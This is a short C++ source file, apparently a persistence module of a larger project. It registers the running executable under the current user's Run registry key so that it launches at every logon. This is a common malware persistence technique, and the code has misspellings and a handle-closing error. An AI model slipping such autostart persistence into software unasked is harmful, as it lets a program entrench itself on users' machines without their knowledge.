#include "Presistence.h"

#include <iostream>
#include <windows.h>

#include "Registry.h"

void getProcessExe(LPSTR path, SIZE_T size) {
    GetModuleFileNameA(NULL, path, size);
}

void RegistryLogon(LPCSTR path, SIZE_T pathLength) {
    std::cout << path << "\n";
    try {
        HKEY key = createKey(HKEY_CURRENT_USER, RUN_KEY, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, NULL);

        const BYTE* pathBytes = reinterpret_cast<const BYTE*>(path);
        setValueIfNotAllReadyExsits(key, KEY_NAME, REG_SZ, pathBytes, pathLength);
        CloseHandle(key);

    } catch (const RegistryException& error) {
        std::cerr << "Error: " << error.funcName << "status code: " << error.status << "\n";
        throw PresistenceException(1, "RegistryLogon");
    }
}


PresistenceException::PresistenceException(int status, std::string funcName) : Exception(status, funcName) {
    // intatinly empty
}
